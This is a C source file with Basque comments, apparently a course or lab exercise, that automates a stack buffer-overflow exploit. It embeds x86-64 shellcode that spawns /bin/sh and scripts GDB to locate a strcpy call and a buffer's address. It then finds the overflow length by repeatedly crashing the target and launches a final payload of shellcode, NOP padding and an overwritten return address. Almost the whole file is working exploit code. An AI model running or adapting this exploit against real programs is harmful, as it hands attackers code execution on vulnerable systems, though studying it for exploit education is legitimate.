#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <pty.h>
#include <utmp.h>

/* Shellcode /bin/sh exekutatzeko*/
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x48, 0x31, 0xff, 0x57, 0x48,
    0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x57,
    0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f,
    0x05
};
#define SHELLCODE_SIZE (sizeof(shellcode))
/*
 * Funtzioa: find_buffer_address
 *
 * GDB erabiltzen du bitarraren buffer aldagaiaren helbidea lortzeko.
 * Prozedura:
 *   1. Exekutatu:
 *            run <vuln_param>
 *            disas main
 *            quit
 *
 *   2. Main-en disassemblytik lerroz-lerro ateratzen dira 
 *      "call" edo "callq" instrukzioak, eta deitzen diren funtzioen 
 *      izenak gordetzen dira ('<' eta '>' artean dagoena erabiliz).
 *
 *   3. Zerrenda horrekin beste script bat osatzen da, funtzio bakoitza
 *      desensanblatzen duena, "strcpy" katearen lehen agerraldia bilatzeko.
 *      Lerro horretik helbide bat ateratzen da (formatoa "0x...").
 *
 *   4. Azken script bat sortzen da honekin:
 *            run <vuln_param>
 *            b *<helbide_ateratakoa>
 *            run <vuln_param>
 *            p &aldagaia
 *            quit
 *      Irteerako "0x" azken agerraldia aldagaiaren helbide gisa hartzen da.
 *
 * Helbidea itzultzen da edo 0 errore kasuan.
 *
 */
unsigned long find_buffer_address(char *vuln_bin, char *aldagaia) {
    char *vuln_param = "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb0\xe1\xff\xff\xff\x7f\x00\x00";	// Exekutatzeko adibidezko parametro balioak
    char gdb_cmd_file[] = "gdb_cmds.txt";
    char buffer_line[4096];
    FILE *fp;

    /* Pausoa 1: main desensanblatu */
    FILE *f = fopen(gdb_cmd_file, "w");
    if (!f) { perror("fopen"); exit(1); }
    fprintf(f, "set follow-fork-mode child\n");
    fprintf(f, "run %s\n", vuln_param);
    fprintf(f, "disas main\n");
    fprintf(f, "quit\n");
    fclose(f);

    char gdb_command[512];
    snprintf(gdb_command, sizeof(gdb_command),
             "gdb -q -batch -x %s %s 2>&1",
             gdb_cmd_file, vuln_bin);
    printf("[*] Ejecutando GDB (disas main):\n%s\n", gdb_command);

    fp = popen(gdb_command, "r");
    if (!fp) { perror("popen"); exit(1); }
    char gdb_output_main[8192] = "";
    while (fgets(buffer_line, sizeof(buffer_line), fp) != NULL)
        strcat(gdb_output_main, buffer_line);
    pclose(fp);

    /* Pausoa 1.1: main dissasembly parseatu funtzioak aurkitzeko */
    char functions[100][256];
    int func_count = 0;
    char *line = strtok(gdb_output_main, "\n");
    while (line != NULL) {
        if (strstr(line, "call")) {
            char *call_pos = strstr(line, "callq");
            if (!call_pos)
                call_pos = strstr(line, "call");
            if (call_pos) {
                char *operand = call_pos + (strncmp(call_pos, "callq", 5) == 0 ? 5 : 4);
                while (*operand == ' ' || *operand == '\t') operand++;

                char *func_start = strchr(operand, '<');
                char *func_end = strchr(operand, '>');
                if (func_start && func_end && func_end > func_start) {
                    int len = func_end - (func_start + 1);
                    char tmp[256];
                    strncpy(tmp, func_start + 1, len);
                    tmp[len] = '\0';

                    /* Eliminar sufijos como "@plt" o "+offset" */
                    char *at = strchr(tmp, '@');
                    if (at) *at = '\0';
                    char *plus = strchr(tmp, '+');
                    if (plus) *plus = '\0';

                    if (strlen(tmp) > 0) {
                        int exists = 0;
                        for (int i = 0; i < func_count; i++) {
                            if (strcmp(functions[i], tmp) == 0) { exists = 1; break; }
                        }
                        if (!exists)
                            strcpy(functions[func_count++], tmp);
                    }
                }
            }
        }
        line = strtok(NULL, "\n");
    }

    printf("[*] Main-ean deitutako funtzioak:\n");
    for (int i = 0; i < func_count; i++)
        printf("  %s\n", functions[i]);

    /* Pauso 2: Funtzio bakoitza desensanblatu eta "strcpy" bilatu */
    FILE *f2 = fopen(gdb_cmd_file, "w");
    if (!f2) { perror("fopen"); exit(1); }
    fprintf(f2, "set follow-fork-mode child\n");
    fprintf(f2, "run %s\n", vuln_param);
    for (int i = 0; i < func_count; i++)
        fprintf(f2, "disas %s\n", functions[i]);
    fprintf(f2, "quit\n");
    fclose(f2);

    snprintf(gdb_command, sizeof(gdb_command),
             "gdb -q -batch -x %s %s 2>&1",
             gdb_cmd_file, vuln_bin);
    printf("[*] GDB exekutatzen (funztio bakoitzaren dissasembly):\n%s\n", gdb_command);

    fp = popen(gdb_command, "r");
    if (!fp) { perror("popen"); exit(1); }
    char gdb_output_funcs[16384] = "";
    while (fgets(buffer_line, sizeof(buffer_line), fp) != NULL)
        strcat(gdb_output_funcs, buffer_line);
    pclose(fp);
    
    /* "strcpy" bilatu eta bertan jarri breakpoint-a zeren bai a la bai egongo dela dakigu */
    char *str_ptr = strstr(gdb_output_funcs, "strcpy");
    char vulnerable_func[256] = "";
    char vulnerable_addr[256] = "";
    if (str_ptr) {
        char *line_start = str_ptr;
        while (line_start > gdb_output_funcs && *(line_start - 1) != '\n')
            line_start--;
        char *addr_start = strstr(line_start, "0x");
        if (addr_start) {
            char *addr_end = addr_start;
            while (*addr_end && *addr_end != ' ' && *addr_end != '\t')
                addr_end++;
            int addr_len = addr_end - addr_start;
            strncpy(vulnerable_addr, addr_start, addr_len);
            vulnerable_addr[addr_len] = '\0';
        }
        char *last_occurrence = NULL, *search_ptr = gdb_output_funcs;
        while ((search_ptr = strstr(search_ptr, "Disassembly of function ")) != NULL && search_ptr < line_start) {
            last_occurrence = search_ptr;
            search_ptr += strlen("Disassembly of function ");
        }
        if (last_occurrence) {
            char *name_start = last_occurrence + strlen("Disassembly of function ");
            char *name_end = strchr(name_start, ':');
            if (name_end) {
                int name_len = name_end - name_start;
                strncpy(vulnerable_func, name_start, name_len);
                vulnerable_func[name_len] = '\0';
            }
        }
    } else {
        printf("[-] Ez da aurkitu 'strcpy' funtzioetan.\n");
        return 0;
    }

    printf("[*] Funtzioa aurkitua: %s\n", vulnerable_func);
    printf("[*] Breakpoint-a jartzeko helbidea: %s\n", vulnerable_addr);

    /* Pauso 3: GDB exekutatu aldagaiaren helbidea lortzeko breakpoint-az baliatuz */
    FILE *f3 = fopen(gdb_cmd_file, "w");
    if (!f3) { perror("fopen"); exit(1); }
    fprintf(f3, "set follow-fork-mode child\n");
    fprintf(f3, "run %s\n", vuln_param);
    fprintf(f3, "b *%s\n", vulnerable_addr);
    fprintf(f3, "run %s\n", vuln_param);
    fprintf(f3, "p &%s\n", aldagaia);
    fprintf(f3, "quit\n");
    fclose(f3);
    
    snprintf(gdb_command, sizeof(gdb_command),
        "gdb -q -batch -x %s %s 2>&1",
        gdb_cmd_file, vuln_bin);
    printf("[*] GDB exekutatzen(aldagai helbidea lortzen):\n%s\n", gdb_command);

    fp = popen(gdb_command, "r");
    if (!fp) { perror("popen"); exit(1); }
    char final_output[4096] = "";
    while (fgets(buffer_line, sizeof(buffer_line), fp) != NULL)
        strcat(final_output, buffer_line);
    pclose(fp);

   printf("%s\n", final_output); 
    unsigned long buf_addr = 0;
    char *p_ptr = final_output, *last_0x = NULL;
    while ((p_ptr = strstr(p_ptr, "0x")) != NULL) {
        last_0x = p_ptr;
        p_ptr += 2;
    }
    if (last_0x) {
        sscanf(last_0x, "%lx", &buf_addr);
        printf("[*] %s aldagaiaren helbidea aurkitua: 0x%lx\n", aldagaia, buf_addr);
    } else {
        printf("[-] Ez da aurkitu helbiderik %s aldagaiarentzat.\n", aldagaia);
    }
    
    remove(gdb_cmd_file);
    // 16 gehitu GDB-ren helbidearekiko desfase bat dagoelako beti
    return buf_addr + 16;
}
/*
 * Funtzioa: main
 *
 * Parametro gisa jasotzen ditu:
 *   argv[1] -> Bitar zaurgarria exekutatzen duen bitarra.
 *   argv[2] -> Bitar zaurgarriaren izena.
 *   argv[3] -> Payload gordeko duen aldagaiaren izena.
 *
 * Lehendabizi payload osatzeko itzulera helbidea bilatuko da. Ondoren, NOP zenbakia zehaztuko da buffer
 * tamaina bidez. Azkenik, payload osatu eta exekutatu.
 */
int main(int argc, char *argv[]) {

    if (argc < 4) {
        fprintf(stderr, "Erabilera: %s <bitar_exekutatzailea> <bitar_zaurgarria> <aldagai_izena>\n", argv[0]);
        return 1;
    }

    // Parametro jasotzea
    char *executor_bin = argv[1];
    char *vuln_bin = argv[2];
    char *aldagaia = argv[3];


    // Fase 1: Algagai helbidea lortu
    unsigned long buffer_addr = 0;

    buffer_addr = find_buffer_address( vuln_bin, aldagaia);
    if (buffer_addr == 0) {
        fprintf(stderr, "[-] Ezin da %s aldagai helbidea lortu.\n", aldagaia);
        return 1;
    }
    printf("[*] %s helbidea: 0x%lx\n", aldagaia, buffer_addr);

    // Fase 2: NOP zenbakia kalkulatu
    int payload_len = SHELLCODE_SIZE;
    int buffer_size = 0;

    while (1) {
        payload_len++;

        char *payload = malloc(payload_len + 1);
        if (!payload) {
            perror("malloc");
            exit(1);
        }

        // Payload osatu: NOPs + shellcode
        memset(payload, 0x90, payload_len);
        memcpy(payload, shellcode, SHELLCODE_SIZE);
        payload[payload_len] = '\0';

        printf("\n[*] Payload-a testatzen (%d byte):\n", payload_len);
        for (int i = 0; i < payload_len; i++) {
            printf("%02x ", (unsigned char)payload[i]);
            if ((i+1) % 16 == 0) printf("\n");
        }
        printf("\n");

        // Bitarra exekutatu payload-arekin
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(1);
        }

        if (pid == 0) {
            execl(vuln_bin, vuln_bin, payload, NULL);
            perror("execl");
            exit(1);
        }

        int status;
        waitpid(pid, &status, 0);

        // segfault detektatu(overflow arrakastatsua)
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGSEGV) {
            buffer_size = payload_len;
            printf("\n[+] Overflow detektatuta %d bytekin (buffer_tamaina = %d)\n",
                  payload_len, buffer_size);
            free(payload);
            break;
        }

        free(payload);

        if (payload_len > 1024) {
            fprintf(stderr, "[-] Buffer tamaina maximoa helbu da (1024 byte)\n");
            exit(1);
        }
    }

    // Fase 3: Payload finalaren osatzea
    // Osagaiak:
    // - shellcode + NOPS + Itzulera helbidea
    int final_payload_len = buffer_size + 16;
    char *final_payload = malloc(final_payload_len + 1);
    if (!final_payload) {
        perror("malloc");
        exit(1);
    }

    memset(final_payload, 0x90, buffer_size + 8);
    memcpy(final_payload, shellcode, SHELLCODE_SIZE);

    // Itzulera helbidea gain idatzi
    memcpy(final_payload + buffer_size + 8, &buffer_addr, 8);
    final_payload[final_payload_len] = '\0';

    printf("\n[+] Payload FINALA (%d bytes):\n", final_payload_len);
    for (int i = 0; i < final_payload_len; i++) {
        printf("%02x ", (unsigned char)final_payload[i]);
        if ((i+1) % 16 == 0) printf("\n");
    }
    printf("\n");

    int hex_string_len = final_payload_len * 4 + 1;
    char *hex_payload_str = malloc(hex_string_len);
    if (!hex_payload_str) {
        perror("malloc");
        exit(1);
    }
    char *p = hex_payload_str;
    for (int i = 0; i < final_payload_len; i++) {
        sprintf(p, "\\x%02x", (unsigned char)final_payload[i]);
        p += 4;
    }
    *p = '\0';


    // Fase 4: Payload finala exekutazen
    printf("\n");
    printf("//////////////////////////////////////////////\n");
    printf("//          BITARRA EXPLOTATZEN             //\n");
    printf("//////////////////////////////////////////////\n");


    char *exec_args[] = {
        executor_bin,
        vuln_bin,
        hex_payload_str,
        NULL
    };

    printf("[*] '%s' Exekutatzen hurrengo parametroekin:\n", executor_bin);
    printf("    argv[0] = %s\n", executor_bin);
    printf("    argv[1] = %s\n", vuln_bin);
    printf("    argv[2] = %s\n", hex_payload_str);

    execv(executor_bin, exec_args);
    perror("execv errorea");

    free(hex_payload_str);

    return 0;
}
